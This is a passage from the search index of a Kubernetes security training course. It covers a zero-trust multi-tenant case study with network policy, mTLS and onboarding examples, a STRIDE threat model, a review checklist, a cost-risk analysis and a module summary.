BILL[Billing &amp; Metering]\n    end\n\n    subgraph \"Data Layer\"\n        KV[Key Vault&lt;br/&gt;Secrets]\n        OBJ[Object Storage&lt;br/&gt;Per-tenant buckets]\n    end\n\n    CDN --&gt; WAF\n    WAF --&gt; GLB\n    GLB --&gt; IDP\n    IDP --&gt; POL\n    POL --&gt; A_CP\n    POL --&gt; B_CP\n\n    A_CP --&gt; A_W\n    A_W --&gt; A_SM\n    A_SM --&gt; A_DB\n\n    B_CP --&gt; B_W\n    B_W --&gt; B_SM\n    B_SM --&gt; B_DB\n\n    MGMT -.-&gt;|Manages| A_CP\n    MGMT -.-&gt;|Manages| B_CP\n    MON -.-&gt;|Scrapes| A_W\n    MON -.-&gt;|Scrapes| B_W\n    A_W --&gt; KV\n    B_W --&gt; KV\n    A_W --&gt; OBJ\n    B_W --&gt; OBJ\n\n    style A_CP fill:#4ecdc4\n    style B_CP fill:#95e1d3\n    style POL fill:#ff6b6b\n    style IDP fill:#ffa500</code></pre>"},{"location":"15-case-studies/#33-tenant-isolation-strategy","title":"3.3 Tenant Isolation Strategy","text":"<p>Isolation Level Comparison:</p> Isolation Method Security Cost Complexity Use Case Namespace-based Low Low Low Dev/Test, trusted users Node pool isolation Medium Medium Medium Different workload types Cluster per tenant High High High Enterprise customers, compliance Virtual cluster Medium-High Medium Medium Scalable multi-tenancy <p>Implementation: Cluster-per-tenant for Enterprise, Virtual Clusters for SMB:</p> <pre><code># tenant-provisioning.yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: tenant-tiers\n  namespace: platform-management\ndata:\n  tiers.yaml: |\n    tiers:\n      enterprise:\n        isolation: dedicated-cluster\n        features:\n          - dedicated_nodes: true\n          - custom_domain: true\n          - sla: 99.99%\n          - support: 24x7\n          - compliance: all\n        resources:\n          min_nodes: 3\n          max_nodes: 100\n          cpu_per_node: 16\n          memory_per_node: 64Gi\n\n      business:\n        isolation: virtual-cluster\n        features:\n          - dedicated_nodes: false\n          - custom_domain: true\n          - sla: 99.9%\n          - support: business-hours\n          - compliance: soc2\n        resources:\n          cpu_quota: 100\n          memory_quota: 256Gi\n          storage_quota: 1Ti\n\n      starter:\n        isolation: namespace\n        features:\n          - dedicated_nodes: false\n          - custom_domain: false\n          - sla: 99%\n          - support: community\n          - compliance: basic\n        resources:\n          cpu_quota: 10\n          memory_quota: 32Gi\n          storage_quota: 100Gi\n</code></pre>"},{"location":"15-case-studies/#34-zero-trust-network-implementation","title":"3.4 Zero-Trust Network Implementation","text":"<p>Principle: Never trust, always verify</p> <pre><code># zero-trust-policies.yaml\n\n# 1. Deny all traffic by default\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: tenant-a\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n\n---\n# 2. Explicit allow only necessary traffic\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-frontend-to-backend\n  namespace: tenant-a\nspec:\n  podSelector:\n    matchLabels:\n      tier: backend\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          tier: frontend\n    ports:\n    - protocol: TCP\n      port: 8080\n\n---\n# 3. Service mesh authorization policies\napiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata:\n  name: frontend-to-backend-authz\n  namespace: tenant-a\nspec:\n  selector:\n    matchLabels:\n      tier: backend\n  action: ALLOW\n  rules:\n  - from:\n    - source:\n        principals: [\"cluster.local/ns/tenant-a/sa/frontend\"]\n    to:\n    - operation:\n        methods: [\"GET\", \"POST\"]\n        paths: [\"/api/v1/*\"]\n    when:\n    - key: request.auth.claims[tenant]\n      values: [\"tenant-a\"]\n\n---\n# 4. Egress restrictions\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: restrict-egress\n  namespace: tenant-a\nspec:\n  podSelector: {}\n  policyTypes:\n  - Egress\n  egress:\n  # Allow DNS\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n    ports:\n    - protocol: UDP\n      port: 53\n  # Allow only to approved external services\n  - to:\n    - podSelector:\n        matchLabels:\n          app: egress-gateway\n    ports:\n    - protocol: TCP\n      port: 443\n</code></pre> <p>mTLS Everywhere:</p> <pre><code># Istio PeerAuthentication for strict mTLS\napiVersion: security.istio.io/v1beta1\nkind: PeerAuthentication\nmetadata:\n  name: default\n  namespace: istio-system\nspec:\n  mtls:\n    mode: STRICT\n---\n# Per-namespace enforcement\napiVersion: security.istio.io/v1beta1\nkind: PeerAuthentication\nmetadata:\n  name: tenant-mtls\n  namespace: tenant-a\nspec:\n  mtls:\n    mode: STRICT\n  portLevelMtls:\n    8080:\n      mode: STRICT\n</code></pre>"},{"location":"15-case-studies/#35-automated-tenant-onboarding","title":"3.5 Automated Tenant Onboarding","text":"<p>GitOps-driven Provisioning:</p> <pre><code># tenant-onboarding-template.yaml\napiVersion: argoproj.io/v1alpha1\nkind: ApplicationSet\nmetadata:\n  name: tenant-onboarding\n  namespace: argocd\nspec:\n  generators:\n  - list:\n      elements:\n      - tenant: acme-corp\n        tier: enterprise\n        region: us-east-1\n        cluster: dedicated\n      - tenant: startup-inc\n        tier: business\n        region: eu-west-1\n        cluster: shared\n  template:\n    metadata:\n      name: '{{tenant}}-infra'\n    spec:\n      project: tenants\n      source:\n        repoURL: https://github.com/platform/tenant-templates\n        targetRevision: main\n        path: 'tenants/{{tier}}'\n        helm:\n          parameters:\n          - name: tenant.name\n            value: '{{tenant}}'\n          - name: tenant.tier\n            value: '{{tier}}'\n          - name: tenant.region\n            value: '{{region}}'\n      destination:\n        server: '{{cluster}}'\n        namespace: '{{tenant}}'\n      syncPolicy:\n        automated:\n          prune: true\n          selfHeal: true\n        syncOptions:\n        - CreateNamespace=true\n</code></pre> <p>Onboarding Workflow:</p> <pre><code>#!/bin/bash\n# onboard-tenant.sh\n\nTENANT_NAME=\"$1\"\nTENANT_TIER=\"$2\"  # enterprise, business, starter\nTENANT_REGION=\"$3\"\n\nset -e\n\necho \"=== Onboarding Tenant: ${TENANT_NAME} ===\"\n\n# 1. Create tenant config\ncat &lt;&lt;EOF &gt; /tmp/tenant-${TENANT_NAME}.yaml\napiVersion: platform.example.com/v1\nkind: Tenant\nmetadata:\n  name: ${TENANT_NAME}\nspec:\n  tier: ${TENANT_TIER}\n  region: ${TENANT_REGION}\n  resources:\n    cpuQuota: $(get_tier_cpu_quota ${TENANT_TIER})\n    memoryQuota: $(get_tier_memory_quota ${TENANT_TIER})\n    storageQuota: $(get_tier_storage_quota ${TENANT_TIER})\n  networking:\n    allowedEgress:\n      - \"*.${TENANT_NAME}.example.com\"\n      - \"api.stripe.com\"\n      - \"api.twilio.com\"\n  compliance:\n    dataResidency: ${TENANT_REGION}\n    encryption: required\n    auditLogging: enabled\nEOF\n\n# 2. Provision infrastructure\nif [ \"${TENANT_TIER}\" == \"enterprise\" ]; then\n  echo \"Provisioning dedicated cluster...\"\n  kubectl apply -f - &lt;&lt;EOF\napiVersion: cluster.x-k8s.io/v1beta1\nkind: Cluster\nmetadata:\n  name: ${TENANT_NAME}-cluster\n  namespace: tenant-clusters\nspec:\n  clusterNetwork:\n    pods:\n      cidrBlocks: [\"10.${TENANT_ID}.0.0/16\"]\n  infrastructureRef:\n    apiVersion: infrastructure.cluster.x-k8s.io/v1beta2\n    kind: AWSCluster\n    name: ${TENANT_NAME}-cluster\n  controlPlaneRef:\n    apiVersion: controlplane.cluster.x-k8s.io/v1beta1\n    kind: KubeadmControlPlane\n    name: ${TENANT_NAME}-control-plane\nEOF\n\n  # Wait for cluster ready\n  kubectl wait --for=condition=ready cluster/${TENANT_NAME}-cluster -n tenant-clusters --timeout=1200s\n\nelse\n  echo \"Provisioning virtual cluster...\"\n  vcluster create ${TENANT_NAME} \\\n    --namespace ${TENANT_NAME} \\\n    --connect=false \\\n    --expose\nfi\n\n# 3. Configure tenant namespace\nkubectl create namespace ${TENANT_NAME}\n\nkubectl label namespace ${TENANT_NAME} \\\n  tenant=${TENANT_NAME} \\\n  tier=${TENANT_TIER} \\\n  region=${TENANT_REGION} \\\n  pod-security.kubernetes.io/enforce=restricted\n\n# 4. Apply resource quotas\nkubectl apply -f - &lt;&lt;EOF\napiVersion: v1\nkind: ResourceQuota\nmetadata:\n  name: ${TENANT_NAME}-quota\n  namespace: ${TENANT_NAME}\nspec:\n  hard:\n    requests.cpu: \"$(get_tier_cpu_quota ${TENANT_TIER})\"\n    requests.memory: \"$(get_tier_memory_quota ${TENANT_TIER})\"\n    persistentvolumeclaims: \"50\"\n    services.loadbalancers: \"$(get_tier_lb_quota ${TENANT_TIER})\"\nEOF\n\n# 5. Setup RBAC\nkubectl apply -f - &lt;&lt;EOF\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: ${TENANT_NAME}-admin\n  namespace: ${TENANT_NAME}\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: admin\nsubjects:\n- kind: Group\n  name: ${TENANT_NAME}-admins\n  apiGroup: rbac.authorization.k8s.io\nEOF\n\n# 6. Configure networking\nkubectl apply -f - &lt;&lt;EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny\n  namespace: ${TENANT_NAME}\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n---\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-ingress-from-istio\n  namespace: ${TENANT_NAME}\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          name: istio-system\nEOF\n\n# 7. Setup monitoring\nkubectl apply -f - &lt;&lt;EOF\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: prometheus\n  namespace: ${TENANT_NAME}\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: prometheus\n  namespace: ${TENANT_NAME}\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: prometheus\nsubjects:\n- kind: ServiceAccount\n  name: prometheus\n  namespace: monitoring\nEOF\n\n# 8. Create tenant credentials\nkubectl create secret generic ${TENANT_NAME}-credentials \\\n  --from-literal=tenant-id=${TENANT_NAME} \\\n  --from-literal=api-key=$(openssl rand -base64 32) \\\n  -n ${TENANT_NAME}\n\n# 9. Deploy ArgoCD application\nkubectl apply -f /tmp/tenant-${TENANT_NAME}.yaml\n\necho \"=== Tenant ${TENANT_NAME} onboarded successfully ===\"\necho \"API Key: $(kubectl get secret ${TENANT_NAME}-credentials -n ${TENANT_NAME} -o jsonpath='{.data.api-key}' | base64 -d)\"\n</code></pre>"},{"location":"15-case-studies/#36-results","title":"3.6 Results","text":"<p>Platform Metrics: - 50,000+ active tenants - 99.99% platform availability - &lt; 5 minute tenant provisioning - Zero cross-tenant data leaks - $50M ARR from platform</p> <p>Security Achievements: - SOC 2 Type II compliance - ISO 27001 certification - GDPR compliance - Zero security incidents in 2 years - 100% encrypted traffic (mTLS)</p>"},{"location":"15-case-studies/#4-threat-modeling-with-stride","title":"4. Threat Modeling with STRIDE","text":""},{"location":"15-case-studies/#41-stride-framework-for-kubernetes","title":"4.1 STRIDE Framework for Kubernetes","text":"<pre><code>stride_threats:\n  spoofing:\n    - threat: \"Attacker impersonates service account\"\n      mitigation: \"Service account token projection with short TTL\"\n\n    - threat: \"Pod spoofs identity to access secrets\"\n      mitigation: \"Workload identity with OIDC, OPA policies\"\n\n  tampering:\n    - threat: \"Malicious image injected into registry\"\n      mitigation: \"Image signing with Notary/Cosign, admission webhooks\"\n\n    - threat: \"ConfigMap modified by unauthorized user\"\n      mitigation: \"RBAC restrictions, audit logging, GitOps\"\n\n  repudiation:\n    - threat: \"Admin denies deleting production namespace\"\n      mitigation: \"Comprehensive audit logs, SIEM integration, non-repudiation\"\n\n    - threat: \"No evidence of API access\"\n      mitigation: \"Audit policy logs all RequestResponse\"\n\n  information_disclosure:\n    - threat: \"Secrets exposed in environment variables\"\n      mitigation: \"External secrets operator, secret scanning\"\n\n    - threat: \"Logs contain sensitive data\"\n      mitigation: \"Log filtering, encryption, access control\"\n\n  denial_of_service:\n    - threat: \"Resource exhaustion by malicious pod\"\n      mitigation: \"ResourceQuotas, LimitRanges, PodDisruptionBudgets\"\n\n    - threat: \"API server overwhelmed with requests\"\n      mitigation: \"Rate limiting, EventRateLimit admission controller\"\n\n  elevation_of_privilege:\n    - threat: \"Container escape to host\"\n      mitigation: \"Restricted PSS, seccomp, AppArmor, no privileged pods\"\n\n    - threat: \"Service account privilege escalation\"\n      mitigation: \"Least-privilege RBAC, no cluster-admin bindings\"\n</code></pre>"},{"location":"15-case-studies/#42-threat-modeling-exercise","title":"4.2 Threat Modeling Exercise","text":"<p>Scenario: E-commerce application on Kubernetes</p> <pre><code>graph LR\n    U[User] --&gt;|HTTPS| I[Ingress]\n    I --&gt;|HTTP| F[Frontend Pod]\n    F --&gt;|HTTP| A[API Pod]\n    A --&gt;|TCP| D[(Database)]\n    A --&gt;|HTTP| P[Payment Service]\n    A --&gt;|Read| S[Secrets]\n\n    style I fill:#90ee90\n    style F fill:#87ceeb\n    style A fill:#87ceeb\n    style D fill:#ff6b6b\n    style P fill:#ffa500\n    style S fill:#ff0000</code></pre> <p>Threat Analysis:</p> <pre><code># Threat model for e-commerce app\nthreats:\n  - id: T1\n    component: Ingress\n    threat_type: Spoofing\n    description: \"Attacker intercepts traffic, performs MITM\"\n    likelihood: Medium\n    impact: High\n    risk_score: 8\n    mitigations:\n      - TLS 1.3 with strong ciphers\n      - HSTS headers\n      - Certificate pinning\n      - WAF in front of ingress\n\n  - id: T2\n    component: API Pod\n    threat_type: Elevation of Privilege\n    description: \"Compromised API pod escalates to cluster-admin\"\n    likelihood: Low\n    impact: Critical\n    risk_score: 7\n    mitigations:\n      - Restricted Pod Security Standard\n      - No privileged containers\n      - Read-only root filesystem\n      - Drop all capabilities\n      - Non-root user\n      - RBAC least privilege\n\n  - id: T3\n    component: Database\n    threat_type: Information Disclosure\n    description: \"Database credentials stolen from pod\"\n    likelihood: Medium\n    impact: Critical\n    risk_score: 9\n    mitigations:\n      - External Secrets Operator (Vault)\n      - Short-lived credentials\n      - Encrypt secrets at rest\n      - Rotate credentials regularly\n      - Audit all secret access\n\n  - id: T4\n    component: Payment Service\n    threat_type: Tampering\n    description: \"Malicious payment service image deployed\"\n    likelihood: Low\n    impact: Critical\n    risk_score: 7\n    mitigations:\n      - Image signing with Cosign\n      - Admission webhook validates signatures\n      - Private registry with access control\n      - Vulnerability scanning in CI/CD\n      - OPA policy requires signed images\n\n  - id: T5\n    component: Frontend Pod\n    threat_type: Denial of Service\n    description: \"Resource exhaustion crashes frontend\"\n    likelihood: High\n    impact: Medium\n    risk_score: 6\n    mitigations:\n      - ResourceQuota on namespace\n      - LimitRange for pod resources\n      - HorizontalPodAutoscaler\n      - PodDisruptionBudget\n      - Rate limiting at ingress\n\n  - id: T6\n    component: API Pod\n    threat_type: Repudiation\n    description: \"Attacker performs malicious actions without audit trail\"\n    likelihood: Low\n    impact: High\n    risk_score: 5\n    mitigations:\n      - Kubernetes audit logging\n      - Application-level audit logs\n      - SIEM integration (Splunk)\n      - Immutable log storage\n      - Non-repudiation via digital signatures\n</code></pre>"},{"location":"15-case-studies/#5-security-architecture-review-checklist","title":"5. Security Architecture Review Checklist","text":"<pre><code># Kubernetes Security Architecture Review\n\n## 1. Identity and Access Management\n- [ ] Strong authentication (OIDC, certificates, no basic auth)\n- [ ] MFA enforced for human access\n- [ ] Service accounts follow least privilege\n- [ ] No default service accounts used\n- [ ] RBAC policies reviewed and minimal\n- [ ] No cluster-admin bindings except break-glass\n- [ ] Regular access reviews conducted\n- [ ] Service account token projection used (short TTL)\n\n## 2. Network Security\n- [ ] Default deny network policies in all namespaces\n- [ ] Explicit allow policies for necessary traffic\n- [ ] Ingress controller with TLS termination\n- [ ] TLS 1.3 enforced for all external traffic\n- [ ] Service mesh with mTLS (optional but recommended)\n- [ ] Egress traffic controlled and monitored\n- [ ] Network segmentation between tiers\n- [ ] No hostNetwork pods (except essential system)\n\n## 3. Pod Security\n- [ ] Pod Security Standards enforced (Restricted profile)\n- [ ] No privileged pods\n- [ ] Containers run as non-root\n- [ ] Read-only root filesystem where possible\n- [ ] Capabilities dropped (all except necessary)\n- [ ] Seccomp profile applied (RuntimeDefault or custom)\n- [ ] AppArmor or SELinux profiles applied\n- [ ] Resource limits set on all containers\n\n## 4. Secrets Management\n- [ ] Secrets encrypted at rest\n- [ ] External secrets management (Vault, Azure Key Vault)\n- [ ] No secrets in environment variables\n- [ ] No secrets in container images\n- [ ] Secret rotation automated\n- [ ] Audit logging for secret access\n- [ ] Least privilege access to secrets\n\n## 5. Container Security\n- [ ] Images scanned for vulnerabilities\n- [ ] Image signing enforced (Notary, Cosign)\n- [ ] Private registry with access control\n- [ ] Base images regularly updated\n- [ ] No images from untrusted registries\n- [ ] Admission webhook validates images\n- [ ] Runtime security monitoring (Falco)\n\n## 6. Control Plane Security\n- [ ] etcd encrypted at rest\n- [ ] etcd using mTLS for all connections\n- [ ] API server audit logging enabled\n- [ ] Audit logs sent to SIEM\n- [ ] API server anonymous auth disabled\n- [ ] API server profiling disabled\n- [ ] Admission controllers properly configured\n- [ ] Encryption provider config for secrets\n\n## 7. Data Protection\n- [ ] Persistent volumes encrypted\n- [ ] Data classification documented\n- [ ] Sensitive data not in logs\n- [ ] Backup and restore tested\n- [ ] DR plan documented and tested\n- [ ] Data retention policies enforced\n- [ ] GDPR/compliance requirements met\n\n## 8. Monitoring and Incident Response\n- [ ] Centralized logging (ELK, Splunk)\n- [ ] Metrics and alerting (Prometheus, Grafana)\n- [ ] Runtime threat detection (Falco)\n- [ ] Incident response plan documented\n- [ ] Security events trigger alerts\n- [ ] Regular security drills conducted\n- [ ] Forensics capabilities available\n\n## 9. Compliance and Governance\n- [ ] CIS benchmark compliance (kube-bench)\n- [ ] Compliance scanning automated\n- [ ] Policy as code (OPA, Kyverno)\n- [ ] Compliance reports generated\n- [ ] Regular security assessments\n- [ ] Penetration testing conducted\n- [ ] Audit findings remediated\n\n## 10. Supply Chain Security\n- [ ] SBOM generated for images\n- [ ] Dependencies scanned for vulnerabilities\n- [ ] Provenance verification (SLSA)\n- [ ] CI/CD pipeline secured\n- [ ] Code signing enforced\n- [ ] Third-party components vetted\n- [ ] Vendor security assessed\n</code></pre>"},{"location":"15-case-studies/#6-cost-vs-security-tradeoff-analysis","title":"6. Cost vs Security Tradeoff Analysis","text":"<p>Security Investment Model:</p> <pre><code>security_investments:\n  tier_1_essential:\n    cost: low\n    impact: critical\n    roi: very_high\n    implementations:\n      - RBAC and least privilege\n      - Network policies (deny by default)\n      - Pod Security Standards\n      - Resource quotas and limits\n      - Basic audit logging\n      - TLS for ingress\n    annual_cost: $10,000\n    risk_reduction: 70%\n\n  tier_2_recommended:\n    cost: medium\n    impact: high\n    roi: high\n    implementations:\n      - External secrets management (Vault)\n      - Image scanning in CI/CD\n      - Runtime security (Falco)\n      - SIEM integration\n      - Backup and DR (Velero)\n      - Admission control (OPA/Kyverno)\n    annual_cost: $100,000\n    risk_reduction: 20%\n\n  tier_3_advanced:\n    cost: high\n    impact: medium\n    roi: medium\n    implementations:\n      - Service mesh (Istio)\n      - Multi-cluster federation\n      - HSM for encryption\n      - Advanced threat detection (ML-based)\n      - Dedicated security operations team\n      - Bug bounty program\n    annual_cost: $500,000+\n    risk_reduction: 9%\n\n  tier_4_extreme:\n    cost: very_high\n    impact: low\n    roi: low\n    implementations:\n      - Air-gapped clusters\n      - Formal verification\n      - Hardware security modules everywhere\n      - Dedicated per-customer clusters\n      - 24x7 security monitoring team\n    annual_cost: $2,000,000+\n    risk_reduction: 1%\n</code></pre> <p>ROI Calculation:</p> <pre><code>Total Risk Exposure (without security): $10M potential loss/year\nCost of Tier 1+2 security: $110K/year\nRisk Reduction: 90%\nResidual Risk: $1M/year\n\nROI = (Risk Reduced - Security Cost) / Security Cost\nROI = ($9M - $110K) / $110K = 8000% ROI\n\nBreakeven: If even ONE incident is prevented, investment pays for itself\n</code></pre>"},{"location":"15-case-studies/#7-migration-strategy-insecure-to-secure","title":"7. Migration Strategy: Insecure to Secure","text":"<p>7-Phase Migration Plan:</p> <pre><code>migration_phases:\n  phase_1_assessment:\n    duration: 2 weeks\n    activities:\n      - Run kube-bench on current cluster\n      - Document all security gaps\n      - Interview development teams\n      - Review existing RBAC\n      - Assess compliance requirements\n      - Calculate risk exposure\n    deliverables:\n      - Security assessment report\n      - Gap analysis\n      - Prioritized remediation backlog\n\n  phase_2_quick_wins:\n    duration: 2 weeks\n    activities:\n      - Enable audit logging\n      - Implement default deny network policies\n      - Remove cluster-admin bindings\n      - Enable Pod Security Standards (Baseline)\n      - Add resource quotas\n      - Update to supported Kubernetes version\n    risk_reduction: 40%\n\n  phase_3_authentication:\n    duration: 3 weeks\n    activities:\n      - Implement OIDC with corporate IdP\n      - Enforce MFA for all users\n      - Create role-based RBAC policies\n      - Audit and minimize service accounts\n      - Implement break-glass procedures\n    risk_reduction: 15%\n\n  phase_4_network_security:\n    duration: 4 weeks\n    activities:\n      - Implement granular network policies\n      - Deploy Ingress controller with TLS\n      - Consider service mesh for mTLS\n      - Implement egress controls\n      - Network segmentation\n    risk_reduction: 20%\n\n  phase_5_workload_security:\n    duration: 4 weeks\n    activities:\n      - Upgrade to Restricted Pod Security Standard\n      - Implement admission control (OPA)\n      - Deploy runtime security (Falco)\n      - Enable image scanning\n      - Enforce image signing\n    risk_reduction: 15%\n\n  phase_6_data_protection:\n    duration: 3 weeks\n    activities:\n      - Enable encryption at rest\n      - Implement external secrets (Vault)\n      - Deploy backup solution (Velero)\n      - Test disaster recovery\n      - Encrypt sensitive PVs\n    risk_reduction: 8%\n\n  phase_7_continuous_security:\n    duration: Ongoing\n    activities:\n      - Automated compliance scanning\n      - Regular penetration testing\n      - Security training for teams\n      - Incident response drills\n      - Metrics and continuous improvement\n    risk_reduction: 2%\n</code></pre>"},{"location":"15-case-studies/#summary","title":"Summary","text":"<p>This capstone module covered:</p> <ol> <li>Case Study 1 - On-prem financial services with PCI-DSS compliance</li> <li>Case Study 2 - Hybrid cloud healthcare with HIPAA requirements</li> <li>Case Study 3 - Zero-trust multi-tenant SaaS platform</li> <li>Threat Modeling - STRIDE framework applied to Kubernetes</li> <li>Architecture Review - Comprehensive security checklist</li> <li>Cost-Security Tradeoffs - ROI analysis and prioritization</li> <li>Migration Strategy - 7-phase plan from insecure to secure</li> </ol>"},{"location":"15-case-studies/#final-exercise","title":"Final Exercise","text":"<p>Build Your Security Strategy:</p> <ol> <li>Assess your current Kubernetes security posture</li> <li>Perform threat modeling for your applications</li> <li>Create prioritized remediation roadmap</li> <li>Calculate ROI for security investments</li> <li>Present security architecture review to leadership</li> </ol>"},{"location":"15-case-studies/#congratulations","title":"Congratulations!","text":"<p>You've completed the comprehensive Kubernetes Security training. You now have the knowledge and practical skills to: - Design and implement secure Kubernetes architectures - Achieve compliance with industry standards - Respond to security incidents effectively - Make risk-based security decisions - Lead security transformations in your organization</p> <p>Continue Learning: - Stay current with CVEs and security advisories - Participate in Kubernetes security SIG - Contribute to security tools and projects - Share knowledge with the community</p> <p>Training Complete - Go build secure Kubernetes platforms!</p>"},{"location":"MODULES-SUMMARY/","title":"Kubernetes Security Training Modules - Summary","text":""},{"location":"MODULES-SUMMARY/#modules-06-10-advanced-security-topics","title":"Modules 06-10: Advanced Security Topics","text":""},{"location":"MODULES-SUMMARY/#module-06-pod-security-1602-lines","title":"Module 06: Pod Security (1,602 lines)","text":"<p>File: <code>/home/user/K8S-Security/docs/06-pod-security.md</code></p> <p>Topics Covered: - Pod Security Standards (Privileged, Baseline, Restricted) - Pod Security Admission (PSA) configuration - Security contexts (runAsNonRoot, capabilities, fsGroup) - seccomp profiles (RuntimeDefault, Localhost, custom) - AppArmor profiles and enforcement - SELinux contexts and policies - Read-only root filesystems - Complete secure pod examples - Mermaid diagram: Pod Security enforcement flow</p> <p>Key Security Controls: - PSA enforcement at namespace level - Capability dropping (drop ALL, add only required) - Non-root user enforcement - Read-only root filesystem with tmpfs mounts - seccomp/AppArmor/SELinux integration</p> <p>Hands-On Labs: - Lab 1: Implementing Pod Security Admission - Lab 2: Seccomp Profile Creation - Lab 3: AppArmor Profile - Lab 4: Complete Secure Deployment</p>"},{"location":"MODULES-SUMMARY/#module-07-admission-control-and-policy-1861-lines","title":"Module 07: Admission Control and Policy (1,861 lines)","text":"<p>File: <code>/home/user/K8S-Security/docs/07-admission-policy.md</code></p> <p>Topics Covered: - Admission controller architecture and phases - Built-in admission controllers (LimitRanger, ResourceQuota) - ValidatingWebhookConfiguration - MutatingWebhookConfiguration - OPA/Gatekeeper installation and Rego policies - Kyverno policy engine with YAML policies - Policy-as-code patterns - Image verification policies - CI/CD integration for policy testing - Mermaid diagrams: Admission control flow, webhook architecture</p> <p>Key Policy Examples: - Require labels enforcement - Block privileged containers - Enforce resource limits - Image registry restrictions - Sidecar injection - Automatic security context addition</p> <p>Hands-On Labs: - Lab 1: Deploy OPA Gatekeeper - Lab 2: Deploy Kyverno Policy - Lab 3: Mutation Policy</p>"},{"location":"MODULES-SUMMARY/#module-08-observability-and-logging-1495-lines","title":"Module 08: Observability and Logging (1,495 lines)","text":"<p>File: <code>/home/user/K8S-Security/docs/08-observability.md</code></p> <p>Topics Covered: - Three pillars of observability (metrics, logs, traces) - Prometheus stack deployment (kube-prometheus-stack) - Grafana dashboard creation (security-focused) - Fluentd/Fluent Bit for log aggregation - Loki for log storage and querying - Kubernetes audit logging configuration - OpenTelemetry and distributed tracing - Security alerting rules (Alertmanager) - Log retention and compliance - Mermaid diagrams: Observability stack, audit flow</p> <p>Security Metrics: - API server authentication/authorization failures - Privileged container detection - Secret access monitoring - RBAC modification alerts - Network policy violations</p> <p>Key Components: - Prometheus: Time-series metrics - Grafana: Visualization and dashboards - Fluent Bit: Log forwarding - Loki: Log aggregation - Alertmanager: Alert routing</p>"},{"location":"MODULES-SUMMARY/#module-09-supply-chain-and-image-security-1303-lines","title":"Module 09: Supply Chain and Image Security (1,303 lines)","text":"<p>File: <code>/home/user/K8S-Security/docs/09-supply-chain.md</code></p> <p>Topics Covered: - Software supply chain threat model - SLSA framework (Supply chain Levels for Software Artifacts) - Trivy image scanning (vulnerabilities, misconfigurations, secrets) - cosign for image signing and verification - SBOM (Software Bill of Materials) generation with Syft - Private registry security (Harbor, Docker Registry) - Admission webhooks for image validation - Secure CI/CD pipeline patterns (GitHub Actions, GitLab CI) - Incident response for supply chain compromises - Mermaid diagrams: Supply chain threats, CI/CD security flow</p> <p>Key Tools: - Trivy: Vulnerability scanning - cosign/Sigstore: Image signing - Syft: SBOM generation - Harbor: Enterprise registry - Kyverno: Image verification policies</p> <p>Security Controls: - Image vulnerability scanning in CI - Image signing with cryptographic verification - SBOM attachment and analysis - Registry authentication and TLS - Admission control for unsigned images</p>"},{"location":"MODULES-SUMMARY/#module-10-network-security-1704-lines","title":"Module 10: Network Security (1,704 lines)","text":"<p>File: <code>/home/user/K8S-Security/docs/10-network-security.md</code></p> <p>Topics Covered: - Network segmentation strategies - Zero trust networking principles - Advanced network policies (microsegmentation, L7) - Service mesh security (Istio/Linkerd) - Mutual TLS (mTLS) configuration - Certificate management (cert-manager) - Workload identity (SPIFFE/SPIRE) - Egress controls and gateways - DNS security (CoreDNS hardening, DNS policies) - Network monitoring (Hubble, flow logs) - Complete zero trust architecture example - Mermaid diagrams: Network security layers, zero trust architecture, service mesh</p> <p>Service Mesh Features: - Automatic mTLS encryption - Service-to-service authentication - Authorization policies (Istio AuthorizationPolicy, Linkerd ServerAuthorization) - Traffic management and observability</p> <p>Key Security Patterns: - Default deny network policies - Microsegmentation by tier (frontend/backend/database) - Cross-namespace access control - Egress gateway pattern - DNS allowlisting - Zero trust pod deployment</p>"},{"location":"MODULES-SUMMARY/#common-themes-across-all-modules","title":"Common Themes Across All Modules","text":""},{"location":"MODULES-SUMMARY/#security-best-practices","title":"Security Best Practices","text":"<ol> <li>Defense in Depth - Multiple security layers</li> <li>Least Privilege - Minimal permissions required</li> <li>Zero Trust - Never trust, always verify</li> <li>Encryption Everywhere - Data in transit and at rest</li> <li>Continuous Monitoring - Observability and alerting</li> <li>Policy as Code - Version-controlled security policies</li> <li>Automated Security - CI/CD integration for security checks</li> </ol>"},{"location":"MODULES-SUMMARY/#standard-sections-in-each-module","title":"Standard Sections in Each Module","text":"<ul> <li>Overview with prerequisites and time estimates</li> <li>Learning objectives (8-10 per module)</li> <li>Detailed technical content with examples</li> <li>Mermaid diagrams for architecture visualization</li> <li>Production-ready YAML configurations</li> <li>Hands-on labs (3-4 per module)</li> <li>Security checklists</li> <li>Anti-patterns and corrections</li> <li>References to official docs and standards</li> </ul>"},{"location":"MODULES-SUMMARY/#security-frameworks-referenced","title":"Security Frameworks Referenced","text":"<ul> <li>CIS Kubernetes Benchmark</li> <li>NSA/CISA Kubernetes Hardening Guide</li> <li>NIST SP 800-190 (Container Security)</li> <li>NIST SP 800-207 (Zero Trust Architecture)</li> <li>NIST SP 800-218 (Secure Software Development)</li> <li>CNCF Security TAG documentation</li> <li>SLSA Framework</li> <li>OWASP guidelines</li> </ul>"},{"location":"MODULES-SUMMARY/#production-ready-examples","title":"Production-Ready Examples","text":"<p>All modules include: - Complete, deployable YAML manifests - Security contexts with all required fields - Resource limits and health checks - RBAC configurations - Network policies - Monitoring and alerting configurations - CI/CD pipeline 